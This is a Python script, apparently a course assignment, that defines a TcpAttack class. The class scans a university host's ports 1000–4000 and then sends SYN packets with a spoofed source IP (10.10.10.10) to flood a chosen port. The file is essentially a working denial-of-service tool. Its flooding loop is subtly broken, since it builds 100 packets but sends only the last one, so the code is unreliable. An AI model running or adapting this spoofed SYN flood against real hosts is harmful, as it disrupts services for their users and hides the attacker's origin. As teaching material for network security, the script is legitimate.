import socket
from scapy.all import *
from scapy.layers.inet import TCP, IP

class TcpAttack():
    def __init__(self, spoofIP:str, targetIP:str)->None:
    # spoofIP : String containing the IP address to spoof
        
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget ( self , rangeStart :int , rangeEnd :int )->None:
    # rangeStart : Integer designating the first port in the range of ports being scanned
    # rangeEnd : Integer designating the last port in the range of ports being scanned
    # return value : no return value , however , writes open ports to openports .txt
        
        #Initialize variable
        open_ports = []                                                                 #(5)

        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd+1):                                  #(6)
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )                  #(7)
            sock.settimeout(0.1)                                                        #(8)
            #Try to connect to the ports, if connection established, append to open port and
            #go onto the next port
            try:                                                                        #(9)
                sock.connect( (self.targetIP, testport) )                               #(10)
                open_ports.append(testport)                                             #(11)
            #If connection cannot be established, pass and go onto the next port
            except:                                                                     #(15)
                pass

        OUT = open("openports.txt", 'w')                                                #(28)
        #If there are no open ports, print the message below
        if not open_ports:                                                              #(29)
            print("\n\nNo open ports in the range specified\n")                         #(30)
        #If there are open ports, print the ports
        else:
            print("\n\nThe open ports:\n\n");                                           #(31)    
            for k in range(0, len(open_ports)):                                         #(32)
                print(open_ports[k])                                                    #(38)
                OUT.write("%s\n" % open_ports[k])                                       #(39)
        OUT.close()                                                                     #(40)

    def attackTarget ( self , port :int , numSyn :int )->int:
    # port : integer designating the port that the attack will use
    # numSyn : Integer of Syn packets to send to target IP address at the given port
    # If the port is open , perform a DoS attack and return 1. Otherwise return 0

        #Utilize scapy to create an IP header, TCP header, and a packet for the specified 
        #source and destination IP addresses and ports
        for i in range(numSyn):                                                         #(5)
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)                     #(6)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)            #(7)
            packet = IP_header / TCP_header                                             #(8)
        
        #Send the packets to the destination, and print any exceptions that might happen
        try:                                                                            #(9)
            send(packet)                                                                #(10)
        except Exception as e:                                                          #(11)
            print(e)                                                                    #(11)
            return 0
        return 1

if __name__ == '__main__':
    # Construct an instance of the TcpAttack class and perform scanning and SYN Flood Attack
    spoofIP = "10.10.10.10"
    targetIP = "moonshine.ecn.purdue.edu"

    rangeStart = 1000
    rangeEnd = 4000

    port = 1716
    numSyn = 100

    tcp = TcpAttack(spoofIP,targetIP)
    
    tcp.scanTarget(rangeStart,rangeEnd)

    if tcp.attackTarget(port,numSyn):
        print(f"Port{ port } was open, and flooded with { numSyn } SYN packets ")
 